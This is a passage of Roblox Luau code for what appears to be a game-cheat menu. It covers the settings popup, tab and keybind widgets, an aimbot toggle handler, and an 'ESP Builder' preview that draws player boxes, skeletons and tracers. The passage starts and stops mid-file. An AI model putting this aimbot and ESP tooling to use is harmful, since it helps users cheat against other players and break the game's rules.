local Gear=nn("ImageButton",{Size=UDim2.new(0,20,0,20),Position=UDim2.new(1,-71,0.5,-11),BackgroundTransparency=1,ImageColor3=T.Muted,ScaleType=Enum.ScaleType.Fit,AutoButtonColor=false,Parent=Header}) setIcon(Gear,"118523834089694")
-- SETTINGS POPUP
local POP_W=206
local settingsPop=nn("Frame",{Size=UDim2.new(0,0,0,40),Position=UDim2.new(1,-46,0.5,-1),AnchorPoint=Vector2.new(1,0.5),BackgroundTransparency=1,BorderSizePixel=0,Visible=false,ClipsDescendants=true,ZIndex=100,Parent=Header})
corner(settingsPop,6) table.insert(state.accents,{stroke(settingsPop,T.Accent),"Color"})
nn("TextLabel",{Text="Menu Key",Font=Fn,TextSize=13,TextColor3=T.ValTxt,BackgroundTransparency=1,Position=UDim2.new(0,10,0.5,0),AnchorPoint=Vector2.new(0,0.5),Size=UDim2.new(0,70,0,20),TextXAlignment=Enum.TextXAlignment.Left,ZIndex=101,Parent=settingsPop})
local menuKeyBtn=nn("TextButton",{Size=UDim2.new(0,72,0,22),Position=UDim2.new(1,-38,0.5,0),AnchorPoint=Vector2.new(1,0.5),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text=shortKey(state.menuKey),Font=FB,TextSize=11,TextColor3=T.Accent,AutoButtonColor=false,ZIndex=101,Parent=settingsPop}) corner(menuKeyBtn,8) table.insert(state.live,function() menuKeyBtn.TextColor3=T.Accent end)
local popListening=false
menuKeyBtn.MouseButton1Click:Connect(function() popListening=true menuKeyBtn.Text="..." menuKeyBtn.TextColor3=Color3.new(1,1,1) end)
UIS.InputBegan:Connect(function(i,gp) if popListening and not gp then popListening=false if i.KeyCode==Enum.KeyCode.Escape or i.KeyCode==Enum.KeyCode.Backspace then state.menuKey=Enum.KeyCode.RightShift elseif i.UserInputType==Enum.UserInputType.Keyboard then state.menuKey=i.KeyCode end menuKeyBtn.Text=shortKey(state.menuKey) menuKeyBtn.TextColor3=T.Accent end end)
local outsideHit=nn("Frame",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Visible=false,ZIndex=95,Parent=Screen})
local settingsOpen=false
local function closeSettings() settingsOpen=false tw(settingsPop,0.18,{Size=UDim2.new(0,0,0,40)}) task.delay(0.19,function() settingsPop.Visible=false outsideHit.Visible=false end) if not gearHover then tw(Gear,0.22,{Rotation=0}) end end
Gear.MouseButton1Click:Connect(function() if settingsPop.Visible then closeSettings() else settingsOpen=true settingsPop.Visible=true outsideHit.Visible=true settingsPop.Size=UDim2.new(0,0,0,40) tw(settingsPop,0.22,{Size=UDim2.new(0,POP_W,0,40)}) end end)
local gearHover=false local gearSpin=false
Gear.MouseEnter:Connect(function() gearHover=true if not gearSpin then tw(Gear,0.22,{Rotation=90}) end end)
Gear.MouseLeave:Connect(function() gearHover=false if not gearSpin and not settingsOpen then task.delay(0.24,function() if not gearHover and not gearSpin then tw(Gear,0.22,{Rotation=0}) end end) end end)
Gear.MouseButton1Click:Connect(function()
	gearSpin=true
	tw(Gear,0.28,{Rotation=450})
	task.delay(0.29,function() gearSpin=false if Gear.Parent then Gear.Rotation=(gearHover or settingsOpen) and 90 or 0 end end)
end)
UIS.InputBegan:Connect(function(input)
	if input.UserInputType==Enum.UserInputType.MouseButton1 and settingsPop.Visible then
		local pos=input.Position local popPos,popSize=settingsPop.AbsolutePosition,settingsPop.AbsoluteSize local gearPos,gearSize=Gear.AbsolutePosition,Gear.AbsoluteSize
		local inPopup=pos.X>=popPos.X and pos.X<=popPos.X+popSize.X and pos.Y>=popPos.Y and pos.Y<=popPos.Y+popSize.Y
		local inGear=pos.X>=gearPos.X and pos.X<=gearPos.X+gearSize.X and pos.Y>=gearPos.Y and pos.Y<=gearPos.Y+gearSize.Y
		if not inPopup and not inGear then closeSettings() end
	end
end)
for _,b in pairs({Gear,MinBtn}) do b.MouseEnter:Connect(function() tw(b,0.15,{ImageColor3=T.Text}) end) b.MouseLeave:Connect(function() tw(b,0.15,{ImageColor3=T.Muted}) end) end
local function dragWin() local dr,m0,p0 Header.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dr=true m0=i.Position p0=Win.Position i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dr=false end end) end end) UIS.InputChanged:Connect(function(i) if dr and i.UserInputType==Enum.UserInputType.MouseMovement then local d=i.Position-m0 Win.Position=UDim2.new(p0.X.Scale,p0.X.Offset+d.X,p0.Y.Scale,p0.Y.Offset+d.Y) end end) end dragWin()
local minimized=false MinBtn.MouseButton1Click:Connect(function()
	minimized=not minimized
	closeSettings()
	local content=Win:FindFirstChild("Content")
	if minimized and content then content.Visible=false end
	Rail.BackgroundTransparency=minimized and 1 or 0
	RailBox.Visible=not minimized
	VSep.Visible=not minimized
	if not minimized and content then content.Visible=true end
	Crumb.Visible=not minimized
	Gear.Visible=not minimized
	tw(MinBtn,0.25,{Rotation=minimized and 180 or 0,Position=minimized and UDim2.new(1,-38,0.5,-8) or UDim2.new(1,-38,0.5,-10)})
	tw(Win,0.35,{Size=minimized and UDim2.new(0,300,0,60) or FULL,BackgroundColor3=minimized and Color3.fromRGB(14,14,14) or T.Window})
end)
local Content=nn("Frame",{Name="Content",Size=UDim2.new(0,655,0,414),Position=UDim2.new(0,96,0,105),BackgroundTransparency=1,Parent=Win})
local Tabs={} Tabs.active=nil
local function SwitchTab(name) for nm,t in pairs(Tabs) do if type(t)=="table" then local on=(nm==name) t.Page.Visible=on tw(t.Icon,0.18,{ImageColor3=on and T.Accent or T.Muted}) tw(t.Sel,0.18,{BackgroundColor3=Color3.new(T.Accent.R*0.4,T.Accent.G*0.4,T.Accent.B*0.4),BackgroundTransparency=on and 0.65 or 1}) tw(t.SelSt,0.18,{Color=T.Accent,Transparency=on and 0 or 1}) end end Tabs.active=name setCrumb(name) if Tabs.hook then Tabs.hook() end end
local function setAccent(c) T.Accent=c T.AccentLight=Color3.new(c.R+(1-c.R)*0.5,c.G+(1-c.G)*0.5,c.B+(1-c.B)*0.5) fovDrawing.Color=c if state.accents then for _,e in ipairs(state.accents) do pcall(function() e[1][e[2]]=c end) end end if state.live then for _,f in ipairs(state.live) do pcall(f) end end if keybindEnabled then if not state.accHud then state.accHud=true task.delay(0.15,function() state.accHud=false pcall(setKeybindHud,true) end) end end if friendEnabled then if not state.accFr then state.accFr=true task.delay(0.15,function() state.accFr=false pcall(setFriendHud,true) end) end end setCrumb(Tabs.active or "Menu") local t=Tabs[Tabs.active] if t and t.Sel then t.Sel.BackgroundColor3=Color3.new(c.R*0.4,c.G*0.4,c.B*0.4) t.SelSt.Color=c end if t and t.Icon then t.Icon.ImageColor3=c end end
local function CreateTab(name,iconId,order,szP,xOff)
	local btn=nn("TextButton",{Size=UDim2.new(0,32,0,32),BackgroundTransparency=1,Text="",AutoButtonColor=false,LayoutOrder=order,Parent=RailBox})
	local sel=nn("Frame",{Size=UDim2.new(0,38,0,38),Position=UDim2.new(0.5,-19,0.5,-19),BackgroundColor3=T.Accent,BackgroundTransparency=1,BorderSizePixel=0,ZIndex=1,Parent=btn}) corner(sel,6) local selSt=nn("UIStroke",{Color=T.Accent,Thickness=1,Transparency=1,Parent=sel})
	local sz=szP or 21
	local icon=nn("ImageLabel",{Size=UDim2.new(0,sz,0,sz),Position=UDim2.new(0.5,-sz/2-(xOff or 0),0.5,-sz/2),BackgroundTransparency=1,ImageColor3=T.Muted,ScaleType=Enum.ScaleType.Fit,ZIndex=2,Parent=btn}) setIcon(icon,iconId)
	local page=nn("Frame",{Name="Page",Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,Parent=Content,ClipsDescendants=true})
	local lCol=nn("ScrollingFrame",{Size=UDim2.new(0.5,-6,1,0),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,Parent=page}) list(lCol,8)
	local rCol=nn("ScrollingFrame",{Size=UDim2.new(0.5,-6,1,0),Position=UDim2.new(0.5,6,0,0),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,Parent=page}) list(rCol,8)
	local function makeCard(side,title)
		local col=side=="R" and rCol or lCol
		local group=nn("Frame",{Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Parent=col}) list(group,5)
		nn("UIPadding",{PaddingTop=UDim.new(0,4),Parent=group})
		local ttl=nn("TextLabel",{Name="CardTitle",Text=title,Font=FM,TextSize=13,TextColor3=Color3.fromRGB(158,158,166),BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,Size=UDim2.new(1,-4,0,20),Parent=group})
		local card=nn("Frame",{Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundColor3=T.Card,BorderSizePixel=0,Parent=group})
		corner(card,8) stroke(card,Color3.fromRGB(33,34,36))
		nn("UIPadding",{PaddingTop=UDim.new(0,7),PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8),PaddingBottom=UDim.new(0,12),Parent=card})
		local sc=nn("Frame",{Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,BorderSizePixel=0,Parent=card})
		list(sc,4)
		return sc
	end
	btn.MouseEnter:Connect(function() if Tabs.active~=name then tw(icon,0.12,{ImageColor3=T.Text}) end end)
	btn.MouseLeave:Connect(function() if Tabs.active~=name then tw(icon,0.12,{ImageColor3=T.Muted}) end end)
	btn.MouseButton1Click:Connect(function() SwitchTab(name) end)
	Tabs[name]={Icon=icon,Sel=sel,SelSt=selSt,Page=page,Left=function(t) return makeCard("L",t) end,Right=function(t) return makeCard("R",t) end}
return Tabs[name]
end
local listening=nil
for _,k in ipairs({"conds","kbinds","values","ddrops","live","accents"}) do if type(state[k])~="table" then state[k]={} end end
local function strToKey(s) if type(s)~="string" then return s end if #s==0 then return nil end s=(s:gsub("Enum%.",""):gsub("KeyCode%.",""):gsub("UserInputType%.","")) for _,k in ipairs(Enum.KeyCode:GetEnumItems()) do if k.Name==s then return k end end for _,k in ipairs(Enum.UserInputType:GetEnumItems()) do if k.Name==s then return k end end return nil end
local function rowKey(parent,text) local f=parent local cardNm=nil local tabNm=nil for _=1,6 do if not f then break end f=f.Parent if not f then break end local ct=f:FindFirstChild("CardTitle") if ct then cardNm=ct.Text end if f.Name=="Page" then for k,t in pairs(Tabs) do if type(t)=="table" and t.Page==f then tabNm=k break end end break end end if cardNm and text=="Enabled" then return cardNm,text,tabNm end if cardNm then return cardNm.." > "..text,text,tabNm end return text,text,tabNm end
local function Condition(parent,text,default,fn,indent)
    local X=indent or 0 local r=nn("Frame",{Size=UDim2.new(1,0,0,28),BackgroundTransparency=1,Parent=parent}) local st=default or false
    local box=nn("TextButton",{Size=UDim2.new(0,16,0,16),Position=UDim2.new(0,4+X,0.5,-8),BackgroundColor3=st and T.Accent or T.Track,BorderSizePixel=0,Text="",TextColor3=Color3.new(1,1,1),Font=FB,TextSize=11,AutoButtonColor=false,Parent=r}) nn("UICorner",{CornerRadius=UDim.new(0,3),Parent=box}) local chk=nn("ImageLabel",{Size=UDim2.new(0,11,0,11),Position=UDim2.new(0.5,-5.5,0.5,-5.5),BackgroundTransparency=1,Image="rbxassetid://72193425221883",ImageTransparency=st and 0 or 1,ScaleType=Enum.ScaleType.Fit,ZIndex=2,Parent=box}) table.insert(state.live,function() box.BackgroundColor3=st and T.Accent or T.Track end)
    local lbl=nn("TextLabel",{Text=text,Font=Fn,TextSize=13,TextColor3=st and T.Text or T.ValTxt,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,Position=UDim2.new(0,28+X,0,0),Size=UDim2.new(1,-60-X,1,0),Parent=r})
local bindLbl=nn("TextLabel",{Text="",Font=FB,TextSize=12,TextColor3=T.ValTxt,TextXAlignment=Enum.TextXAlignment.Right,BackgroundTransparency=1,Position=UDim2.new(1,-60,0,0),Size=UDim2.new(0,24,1,0),Parent=r})
local kbBtn=nn("TextButton",{
    Size=UDim2.new(0,29,0,29),
    Position=UDim2.new(1,0,0.5,0),
    AnchorPoint=Vector2.new(1,0.5),
    BackgroundTransparency=1,
    Text="",
    AutoButtonColor=false,
    Parent=r
}) local kbBody=nn("ImageLabel",{Size=UDim2.new(1,0,1,0),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundTransparency=1,Image="rbxassetid://118052613845361",ImageColor3=T.Muted,ScaleType=Enum.ScaleType.Fit,BorderSizePixel=0,Parent=kbBtn}) local function apply(v) st=v box.BackgroundColor3=st and T.Accent or T.Track chk.ImageTransparency=st and 0 or 1 lbl.TextColor3=st and T.Text or T.ValTxt pcall(tw,box,0.15,{BackgroundColor3=st and T.Accent or T.Track}) pcall(tw,chk,0.15,{ImageTransparency=st and 0 or 1}) pcall(tw,lbl,0.15,{TextColor3=st and T.Text or T.ValTxt}) box.Text="" if fn then fn(st) saveState() end end
    box.MouseButton1Click:Connect(function() apply(not st) end)
    local boundKey=nil local binding=false local kbEntry=nil local function ensureKbEntry() if not kbEntry then local nm=text local f=r local cardNm=nil for _=1,6 do if not f then break end f=f.Parent if not f then break end local ct=f:FindFirstChild("CardTitle") if ct then cardNm=ct.Text end if f.Name=="Page" then break end end if cardNm and text=="Enabled" then nm=cardNm end kbEntry={Name=nm,GetKey=function() return boundKey end,GetState=function() return st end} local key=(cardNm and text=="Enabled") and (cardNm.." Bind") or ((cardNm and cardNm.." > " or "")..text.." Bind") table.insert(state.kbinds,{name=key,bare=nm.." Bind",get=function() return boundKey end,set=function(k) k=strToKey(k) boundKey=k pcall(syncKeybindRow,ensureKbEntry()) if k then bindLbl.Text=shortKey(k) bindLbl.TextColor3=T.ValTxt kbBody.ImageColor3=Color3.fromRGB(0,166,255) else bindLbl.Text="" kbBody.ImageColor3=T.Muted end end}) end return kbEntry end kbBtn.MouseButton1Click:Connect(function() binding=true bindLbl.Text="..." bindLbl.TextColor3=T.Accent tw(kbBody,0.1,{Size=UDim2.new(1.2,0,1.2,0)}) task.delay(0.12,function() tw(kbBody,0.18,{Size=UDim2.new(1,0,1,0)}) end) listening=function(key) binding=false boundKey=key syncKeybindRow(ensureKbEntry()) if key then bindLbl.Text=shortKey(key) bindLbl.TextColor3=T.ValTxt kbBody.ImageColor3=Color3.fromRGB(0,166,255) else bindLbl.Text="" kbBody.ImageColor3=T.Muted end end end) kbBtn.MouseEnter:Connect(function() if not boundKey and not binding then tw(kbBody,0.12,{ImageColor3=T.Text}) end end) kbBtn.MouseLeave:Connect(function() if not boundKey and not binding then tw(kbBody,0.12,{ImageColor3=T.Muted}) end end) ensureKbEntry()
    UIS.InputBegan:Connect(function(i,gp) if _G.UniqGen~=GEN then return end if boundKey and not gp and not UIS:GetFocusedTextBox() and i.KeyCode==boundKey then apply(not st) end end)
    local k,b,tb=rowKey(r,text) table.insert(state.conds,{name=k,bare=b,set=apply,get=function() return st end,def=st,bind=kbEntry,tab=tb}) return {Set=function(v) apply(v) end,Get=function() return st end,Row=r}
end
local function KeybindRow(parent,text,default,cb)
    local r=nn("Frame",{Size=UDim2.new(1,0,0,28),BackgroundTransparency=1,Parent=parent})
    nn("TextLabel",{Text=text,Font=Fn,TextSize=13,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,Position=UDim2.new(0,4,0,0),Size=UDim2.new(1,-96,1,0),Parent=r})
    local waiting=false local cur=default
    local btn=nn("TextButton",{Size=UDim2.new(0,84,0,22),Position=UDim2.new(1,-88,0.5,-11),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text=shortKey(default),Font=FB,TextSize=11,TextColor3=default and T.Accent or T.ValTxt,AutoButtonColor=false,Parent=r}) nn("UICorner",{CornerRadius=UDim.new(0,4),Parent=btn}) table.insert(state.live,function() btn.TextColor3=cur and T.Accent or T.ValTxt end)
    btn.MouseButton1Click:Connect(function() waiting=true btn.Text="..." btn.TextColor3=Color3.new(1,1,1) end)
    UIS.InputBegan:Connect(function(i,gp)
        if not waiting then return end waiting=false
        if i.KeyCode==Enum.KeyCode.Escape or i.KeyCode==Enum.KeyCode.Backspace then cur=nil
        elseif i.UserInputType==Enum.UserInputType.Keyboard then cur=i.KeyCode
        elseif i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.MouseButton2 or i.UserInputType==Enum.UserInputType.MouseButton3 then cur=i.UserInputType end
        btn.Text=shortKey(cur) btn.TextColor3=cur and T.Accent or T.ValTxt
        if cb then cb(cur) end
    end)
    local k,b=rowKey(r,text) table.insert(state.kbinds,{name=k.." Bind",bare=b.." Bind",get=function() return cur end,set=function(k) k=strToKey(k) cur=k btn.Text=shortKey(cur) btn.TextColor3=cur and T.Accent or T.ValTxt if cb then cb(cur) end end})
    return {Get=function() return cur end,Row=r}
end
local function Button(parent,text,fn) local b=nn("TextButton",{Size=UDim2.new(1,0,0,32),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text=text,Font=FM,TextSize=13,TextColor3=T.Text,AutoButtonColor=false,Parent=parent}) nn("UICorner",{CornerRadius=UDim.new(0,4),Parent=b}) stroke(b,Color3.fromRGB(38,38,38)) b.MouseEnter:Connect(function() tw(b,0.12,{BackgroundColor3=Color3.fromRGB(50,50,50)}) end) b.MouseLeave:Connect(function() tw(b,0.12,{BackgroundColor3=T.SliderBg}) end) b.MouseButton1Click:Connect(function() local c=T.Accent tw(b,0.08,{BackgroundColor3=Color3.new(c.R*0.35,c.G*0.35,c.B*0.35)}) task.delay(0.15,function() tw(b,0.15,{BackgroundColor3=T.SliderBg}) end) if fn then fn() end end) return b end
UIS.InputBegan:Connect(function(i) if listening then task.wait() local cb=listening listening=nil if i.KeyCode==Enum.KeyCode.Escape or i.KeyCode==Enum.KeyCode.Backspace then cb(nil) return end if i.UserInputType==Enum.UserInputType.Keyboard then cb(i.KeyCode) end end end)
local aimToggleConn
aimToggleConn = UIS.InputBegan:Connect(function(i,gp)
	if gp then return end
	if state.aimbotActivation=="Toggle" and state.aimbotKey then
		local k = state.aimbotKey
		local m = false
		if typeof(k)=="EnumItem" then
			if k.EnumType==Enum.KeyCode and i.KeyCode==k then m=true
			elseif k.EnumType==Enum.UserInputType and i.UserInputType==k then m=true end
		end
		if m then state.aimbotToggled = not state.aimbotToggled end
	end
end)
-- PREVIEW
local previewPos=UDim2.new(1,-560,0,80)
local previewGui,previewActive,previewWanted=nil,false,true
local function closePreview() if previewGui then local wf=previewGui:FindFirstChild("Frame") if wf then previewPos=wf.Position end previewGui:Destroy() previewGui=nil end previewActive=false end
local previewAnimating=false
local function previewCloseAnim()
	if previewAnimating or not previewGui or not previewActive then return end
	previewAnimating=true
	previewActive=false
	if state.previewBtn then state.previewBtn.Text="ESP Builder: Off" end
	local wf=previewGui:FindFirstChild("Frame")
	if wf then
		local pos=wf.Position
		local midY=UDim2.new(pos.X.Scale,pos.X.Offset,pos.Y.Scale,pos.Y.Offset+487/2)
		tw(wf,0.25,{Size=UDim2.new(0,433,0,0),Position=midY})
		task.delay(0.26,function() previewAnimating=false if previewGui then previewGui.Enabled=false end end)
	else
		previewAnimating=false
	end
end
local function previewOpenAnim()
	if previewAnimating then return end
	if not previewGui then TogglePreview() return end
	previewAnimating=true
	previewActive=true
	if state.previewBtn then state.previewBtn.Text="ESP Builder: On" end
	local wf=previewGui:FindFirstChild("Frame")
	if wf then
		previewGui.Enabled=true
		local pos=previewPos
		local midY=UDim2.new(pos.X.Scale,pos.X.Offset,pos.Y.Scale,pos.Y.Offset+487/2)
		wf.Size=UDim2.new(0,433,0,0)
		wf.Position=midY
		tw(wf,0.35,{Size=UDim2.new(0,433,0,487),Position=pos})
		task.delay(0.36,function() previewAnimating=false end)
	else
		previewAnimating=false
	end
end
local function ensurePreview() if previewWanted then if Tabs.active=="Visuals" then if not previewActive then previewOpenAnim() end elseif previewActive then previewCloseAnim() end end end Tabs.hook=ensurePreview
local function TogglePreview(buildOnly)
	if previewActive then previewWanted=false previewCloseAnim() return end
    previewWanted=true previewActive=true if state.previewBtn then state.previewBtn.Text="ESP Builder: On" end
    local old=CoreGui:FindFirstChild("UniqPreview") if old then old:Destroy() end
    local gui=nn("ScreenGui",{Name="UniqPreview",ResetOnSpawn=false,Parent=CoreGui}) previewGui=gui
    local W,H=433,487
    local win=nn("Frame",{Name="Frame",Size=UDim2.new(0,W,0,H),Position=previewPos,BackgroundColor3=Color3.fromRGB(12,12,12),BorderSizePixel=0,ClipsDescendants=true,Parent=gui}) corner(win,8) stroke(win)
    local blk=nn("Frame",{Name="Blocker",BackgroundTransparency=1,BorderSizePixel=0,Active=true,ZIndex=0,Parent=gui}) blk.Size=win.Size blk.Position=win.Position
    win:GetPropertyChangedSignal("Size"):Connect(function() blk.Size=win.Size end)
    win:GetPropertyChangedSignal("Position"):Connect(function() blk.Position=win.Position end)
    win:GetPropertyChangedSignal("Position"):Connect(function() if previewActive then previewPos=win.Position end end)
    local top=nn("Frame",{Size=UDim2.new(1,0,0,28),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Parent=win}) corner(top,8) nn("Frame",{Size=UDim2.new(1,0,0,10),Position=UDim2.new(0,0,1,-10),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Parent=top}) nn("TextLabel",{Text="ESP Builder",Font=FB,TextSize=12,TextColor3=T.Text,BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Parent=top})
    do local dr,m0,p0 top.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dr=true m0=i.Position p0=win.Position i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dr=false end end) end end) UIS.InputChanged:Connect(function(i) if dr and i.UserInputType==Enum.UserInputType.MouseMovement then local d=i.Position-m0 win.Position=UDim2.new(p0.X.Scale,p0.X.Offset+d.X,p0.Y.Scale,p0.Y.Offset+d.Y) end end) end
    local cv=nn("Frame",{Size=UDim2.new(1,0,1,-28),Position=UDim2.new(0,0,0,28),BackgroundTransparency=1,ClipsDescendants=true,Parent=win})
    local ox=W/2
    local headW,headH,headR=54,54,11
    local torsoW,torsoH=93,91
    local armW,armH=42,91
    local legW,legH=45,90
    local gap=3 local headTop=82 local torsoY=headTop+headH+gap local legY=torsoY+torsoH+gap local legBot=legY+legH local pad=10
    local bodyCol=Color3.fromRGB(216,216,219) local headCol=Color3.fromRGB(230,230,232) local edge=Color3.fromRGB(125,125,130)
    local function part(x,y,w,h,col,r) local f=nn("Frame",{Size=UDim2.fromOffset(w,h),Position=UDim2.fromOffset(x,y),BackgroundColor3=col,BorderSizePixel=0,Parent=cv}) corner(f,r or 3) nn("UIStroke",{Color=edge,Thickness=1,Parent=f}) return f end
    part(ox-headW/2,headTop,headW,headH,headCol,headR) part(ox-torsoW/2,torsoY,torsoW,torsoH,bodyCol,4) part(ox-torsoW/2-armW-gap,torsoY,armW,armH,bodyCol,3) part(ox+torsoW/2+gap,torsoY,armW,armH,bodyCol,3) part(ox-legW-1,legY,legW,legH,bodyCol,3) part(ox+1,legY,legW,legH,bodyCol,3)
    local J={headC={ox,headTop+headH/2},neck={ox,torsoY+5},shL={ox-torsoW/2,torsoY+10},shR={ox+torsoW/2,torsoY+10},handL={ox-torsoW/2-armW/2-gap,torsoY+armH-7},handR={ox+torsoW/2+armW/2+gap,torsoY+armH-7},hip={ox,torsoY+torsoH},footL={ox-legW/2,legBot},footR={ox+legW/2,legBot}}
    local skelLines={}
    local function sLine(a,b) local x1,y1=a[1],a[2] local x2,y2=b[1],b[2] local mx,my=(x1+x2)/2,(y1+y2)/2 local dx,dy=x2-x1,y2-y1 local len=math.sqrt(dx*dx+dy*dy) local ang=math.deg(math.atan2(dy,dx)) local l=nn("Frame",{Size=UDim2.fromOffset(len,2),Position=UDim2.fromOffset(mx,my),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=SCol,BorderSizePixel=0,Rotation=ang,ZIndex=3,Parent=cv}) table.insert(skelLines,{f=l,len=len}) end
    sLine(J.headC,J.neck) sLine(J.neck,J.shL) sLine(J.neck,J.shR) sLine(J.shL,J.handL) sLine(J.shR,J.handR) sLine(J.neck,J.hip) sLine(J.hip,J.footL) sLine(J.hip,J.footR)
    local boxTop=headTop-pad local boxBot=legBot+pad local boxLeft=ox-torsoW/2-armW-gap-pad local boxRight=ox+torsoW/2+armW+gap+pad local centerY=(boxTop+boxBot)/2
    local baseBW,baseBH=boxRight-boxLeft,boxBot-boxTop
    local espBox=nn("Frame",{Size=UDim2.fromOffset(baseBW,baseBH),Position=UDim2.fromOffset(boxLeft,boxTop),BackgroundColor3=Color3.fromRGB(0,0,0),BackgroundTransparency=1,BorderSizePixel=0,ZIndex=2,Parent=cv})
    local espStroke=nn("UIStroke",{Thickness=2,Color=BCol,Parent=espBox})
    local cFrames={}
    local function mkC(h,ax,ay) local f=nn("Frame",{BackgroundColor3=BCol,BorderSizePixel=0,Visible=false,AnchorPoint=Vector2.new(ax,ay),Position=UDim2.new(ax,0,ay,0),ZIndex=4,Parent=espBox}) if h then f.Size=UDim2.new(0.3,0,0,2) else f.Size=UDim2.new(0,2,0.12,0) end table.insert(cFrames,{f=f,h=h}) end
    mkC(true,0,0) mkC(false,0,0) mkC(true,1,0) mkC(false,1,0) mkC(true,0,1) mkC(false,0,1) mkC(true,1,1) mkC(false,1,1)
    local tracer=nn("Frame",{Size=UDim2.fromOffset(2,10),Position=UDim2.new(0.5,0.5,0,0),BackgroundColor3=TCol,BorderSizePixel=0,ZIndex=1,Parent=cv})
    local thit=nn("TextButton",{Size=UDim2.new(1,0,1,0),Position=UDim2.new(0,0,0,0),BackgroundTransparency=1,BorderSizePixel=0,Text="",AutoButtonColor=false,ZIndex=0,Parent=cv})
    local nameL=nn("TextButton",{Size=UDim2.fromOffset(126,14),Position=UDim2.fromOffset(ox-63,boxTop-18),BackgroundTransparency=1,Text="PlayerName",Font=TxtFont,TextSize=11,TextColor3=Color3.new(1,1,1),TextStrokeTransparency=0,AutoButtonColor=false,ZIndex=4,Parent=cv})
    local distL=nn("TextButton",{Size=UDim2.fromOffset(72,14),Position=UDim2.fromOffset(ox-36,boxBot-18),BackgroundTransparency=1,Text="50m",Font=TxtFont,TextSize=10,TextColor3=Color3.new(1,1,1),TextStrokeTransparency=0,AutoButtonColor=false,ZIndex=4,Parent=cv})
    local hintL=nn("TextLabel",{Size=UDim2.new(1,-16,0,36),Position=UDim2.new(0.5,0,1,-8),AnchorPoint=Vector2.new(0.5,1),BackgroundTransparency=1,Text="You can reposition the Tracers, Distance and Tags\nby dragging them to your desired place.",Font=Fn,TextSize=13,TextColor3=Color3.fromRGB(140,140,148),TextXAlignment=Enum.TextXAlignment.Center,TextWrapped=true,ZIndex=4,Parent=cv})
    local dots={}
    for i=1,4 do dots[i]=nn("TextButton",{Size=UDim2.fromOffset(10,10),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=T.Accent,BackgroundTransparency=0.4,BorderSizePixel=0,Text="",AutoButtonColor=false,ZIndex=4,Parent=cv}) nn("UICorner",{CornerRadius=UDim.new(0.5,0),Parent=dots[i]}) local k=i table.insert(state.live,function() dots[k].BackgroundColor3=T.Accent end) end
    local function cornerPts() return {[1]={ox,boxTop-18},[2]={ox,boxBot+18},[3]={boxLeft-18,(boxTop+boxBot)/2},[4]={boxRight+18,(boxTop+boxBot)/2}} end
    local function elPosState(el) return el==1 and "namePos" or el==2 and "distPos" or "tracerPos" end
    local function elAnchor(el,p)
        if el==1 then
            local pts={[1]={ox-20,boxTop-40},[2]={ox-20,boxBot+6},[3]={24,centerY-18},[4]={W-150,centerY-18}}
            return pts[p]
        elseif el==2 then
            local pts={[1]={ox-5,boxTop-14},[2]={ox-5,boxBot+24},[3]={44,centerY},[4]={W-130,centerY}}
            return pts[p]
        else
            local pts={[1]={boxLeft,boxTop-2},[2]={boxLeft,boxBot+2},[3]={boxLeft-16,(boxTop+boxBot)/2},[4]={boxRight+2,(boxTop+boxBot)/2}}
            return pts[p]
        end
    end
    local function placeEl(el)
        local p=state[elPosState(el)] or (el==1 and 1 or 2)
        local x,y
        if el==1 then x,y=table.unpack(elAnchor(el,p)) nameL.Position=UDim2.fromOffset(x,y)
        elseif el==2 then x,y=table.unpack(elAnchor(el,p)) distL.Position=UDim2.fromOffset(x,y)
        else
            local thick=math.max(0.1,TracerThick)
            if p==1 then tracer.Size=UDim2.fromOffset(thick,boxTop-2) tracer.Position=UDim2.fromOffset(ox-thick/2,0)
            elseif p==2 then tracer.Size=UDim2.fromOffset(thick,(H-70)-(boxBot+4)) tracer.Position=UDim2.fromOffset(ox-thick/2,boxBot+4)
            elseif p==3 then tracer.Size=UDim2.fromOffset(boxLeft-4,thick) tracer.Position=UDim2.fromOffset(0,centerY-thick/2)
            else tracer.Size=UDim2.fromOffset(W-(boxRight+4),thick) tracer.Position=UDim2.fromOffset(boxRight+4,centerY-thick/2) end
        end
    end
    local dragMode=false local dragEl=nil
    local function placeDots()
        local cp=cornerPts()
        for i,pt in ipairs(cp) do dots[i].Position=UDim2.fromOffset(pt[1],pt[2]) dots[i].Visible=dragMode dots[i].BackgroundTransparency=0.5 end
    end
    local function markActive(el)
        if not el then return end
        local key=(el==1 and "namePos") or (el==2 and "distPos") or "tracerPos"
        local p=state[key] or (el==1 and 1 or 2)
        dots[p].BackgroundTransparency=0
    end
    local xFlip=false local yFlip=false
    local function localMouse(x,y)
        local cp=cv.AbsolutePosition
        local ax=x if xFlip then ax=gui.AbsoluteSize.X-ax end
